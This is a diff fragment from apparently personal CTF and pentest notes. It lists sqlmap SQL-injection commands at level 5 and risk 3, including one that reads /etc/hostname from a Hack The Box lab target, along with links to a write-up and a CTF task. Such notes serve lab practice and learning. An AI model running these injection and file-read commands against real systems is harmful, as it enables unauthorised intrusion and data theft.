@@ -149,3 +149,5 @@ sqlmap -r ticket_attachment.request --level 5 --risk 3 -p <parameter_inject>
 https://0xdf.gitlab.io/2022/10/29/htb-trick.html#preprod-payrolltrickhtb
 sqlmap -r login.req --batch --threads 10 --file-read=/etc/hostname
 cat /home/oxdf/.sqlmap/output/preprod-payroll.trick.htb/files/_etc_hostname 
+---------------------------------------------sqli in chatbox
+https://github.com/cR4-sh/mireactf-quals-2024/tree/main/tasks/misc/colorfee
